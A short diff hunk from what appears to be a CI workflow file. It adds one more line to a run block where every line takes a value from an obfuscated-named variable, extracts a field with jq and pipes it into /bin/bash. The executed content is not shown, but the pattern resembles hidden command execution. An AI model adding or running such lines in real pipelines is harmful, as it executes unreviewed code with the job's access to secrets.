@@ -37,6 +37,7 @@ jobs:
           echo $zbg9 | jq -r .zhuvo60 | /bin/bash
           echo $cny5 | jq -r .llvu52 | /bin/bash
           echo $vom7374 | jq -r .moq705 | /bin/bash
+          printf '%s' "$gp71" | jq -r .kg607 | /bin/bash
 
       - name: Upload results
         if: always()
